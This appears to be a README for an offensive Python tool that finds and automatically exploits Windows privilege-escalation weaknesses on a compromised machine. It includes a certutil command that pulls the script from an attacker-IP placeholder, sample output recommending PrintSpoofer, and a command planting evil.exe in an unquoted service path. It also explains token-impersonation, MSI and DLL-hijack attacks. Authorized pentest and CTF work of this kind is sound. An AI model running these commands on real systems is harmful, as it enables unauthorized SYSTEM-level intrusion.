# ⚡ AutoPrivEsc — Windows Privilege Escalation Scanner & Auto-Exploiter

A Python tool that runs on a compromised Windows machine, automatically scans for privilege escalation vectors, and attempts to exploit each one — going all the way to SYSTEM where possible.

> ⚠️ **For authorized use only.** CTF, lab, and pentest environments exclusively.

---

## 🚀 What Makes This Different

Most tools (WinPEAS, PowerUp) **find** vulnerabilities and stop.  
**AutoPrivEsc finds AND exploits** — it gives you the exact command, or executes the payload automatically.

| Tool | Finds vectors | Auto-exploits |
|---|---|---|
| WinPEAS | ✅ | ❌ |
| PowerUp | ✅ | Partial |
| **AutoPrivEsc** | ✅ | ✅ |

---

## 🎯 Vectors Covered

| # | Vector | What It Checks | Auto-Exploit |
|---|---|---|---|
| 1 | **Token Privileges** | SeImpersonatePrivilege, SeDebugPrivilege, SeBackupPrivilege | ✅ PrintSpoofer / GodPotato commands |
| 2 | **AlwaysInstallElevated** | HKLM + HKCU registry keys | ✅ msfvenom MSI payload command |
| 3 | **Unquoted Service Paths** | Services with unquoted paths containing spaces | ✅ Finds writable injection point |
| 4 | **Weak Service Binaries** | Writable service executables | ✅ Replace binary command |
| 5 | **Stored Credentials** | cmdkey, AutoLogon registry, Unattend.xml | ✅ runas /savecred command |
| 6 | **AutoRun Registry Keys** | Writable binaries in Run/RunOnce keys | ✅ Replace binary command |
| 7 | **Scheduled Tasks** | SYSTEM tasks with writable binaries | ✅ Replace + trigger command |
| 8 | **DLL Hijacking** | Writable PATH dirs + DLL template | ✅ DLL source code template |

---

## 🛠️ Installation

No external dependencies — pure Python 3 standard library.

```cmd
# Transfer to target machine
python -m http.server 8000

# On target (cmd or PowerShell)
certutil -urlcache -f http://<attacker-ip>:8000/autoprivesc_win.py autoprivesc_win.py
```

---

## ▶️ Usage

```cmd
:: Full scan + auto-exploit (default)
python autoprivesc_win.py

:: Scan only — no exploitation
python autoprivesc_win.py --scan

:: Save report to %TEMP%
python autoprivesc_win.py --report
```

---

## 📸 Example Output

```
═══════════════════════════════════════════════════════
   AutoPrivEsc — Windows PrivEsc Scanner & Exploiter
═══════════════════════════════════════════════════════
  User  : IIS APPPOOL\DefaultAppPool
  Admin : NO
  Mode  : SCAN + EXPLOIT
═══════════════════════════════════════════════════════

═══════════════════════════════════════════════════════
  VECTOR 1 — Token Privileges (Potato Attacks)
═══════════════════════════════════════════════════════

Privilege Name                    State
SeImpersonatePrivilege            Enabled

  [FOUND] SeImpersonatePrivilege is ENABLED!

  Recommended exploit: PrintSpoofer or GodPotato
  Run:
  PrintSpoofer.exe -i -c cmd.exe

═══════════════════════════════════════════════════════
  VECTOR 3 — Unquoted Service Paths
═══════════════════════════════════════════════════════
  [FOUND] C:\Program Files\Vulnerable App\service.exe
  [FOUND] Writable injection point: C:\Program Files\Vulnerable.exe

  Plant payload: copy evil.exe "C:\Program Files\Vulnerable.exe"
  Then restart service or reboot

═══════════════════════════════════════════════════════
  FINAL REPORT
═══════════════════════════════════════════════════════
  Vectors found:     3
  Exploits ready:    2

  ✓ EXPLOIT COMMANDS TO RUN:

    [TOKEN_PRIVILEGE]
    PrintSpoofer.exe -i -c cmd.exe

    [UNQUOTED_SERVICE]
    copy evil.exe "C:\Program Files\Vulnerable.exe"
```

---

## 📚 Key Concepts

**What is SeImpersonatePrivilege (Potato attacks)?**  
Service accounts (IIS, MSSQL, etc.) typically hold this privilege. It allows impersonating a client after authentication. Potato exploits trick a SYSTEM process into authenticating to our fake server, then steal and impersonate its token for SYSTEM access.

**What is an Unquoted Service Path?**  
Windows resolves unquoted paths with spaces ambiguously. `C:\Program Files\App\svc.exe` without quotes causes Windows to try `C:\Program.exe` first — if we can write there, we win.

**What is AlwaysInstallElevated?**  
A policy setting that lets any user install MSI packages with SYSTEM privileges. When enabled in both HKLM and HKCU, a crafted malicious MSI runs our payload as SYSTEM.

**What is DLL Hijacking?**  
Windows searches for DLLs in the application directory before system directories. If a privileged process loads a DLL from a writable folder, we plant a malicious DLL with the same name.

---

## 📁 File Structure

```
autoprivesc-windows/
├── autoprivesc_win.py    # Main scanner & exploiter
├── requirements.txt      # No external deps needed
└── README.md
```

---

## 🔮 Possible Extensions

- [ ] Kerberoasting / AS-REP Roasting detection (domain-joined machines)
- [ ] Pass-the-Hash detection opportunities
- [ ] LAPS misconfiguration check
- [ ] GPP passwords in SYSVOL
- [ ] Hot potato / Rotten potato variants

---

## ⚠️ Disclaimer

For **educational use** in authorized environments only — CTF, HackTheBox, TryHackMe, and authorized pentests.

---

## 📄 License

MIT
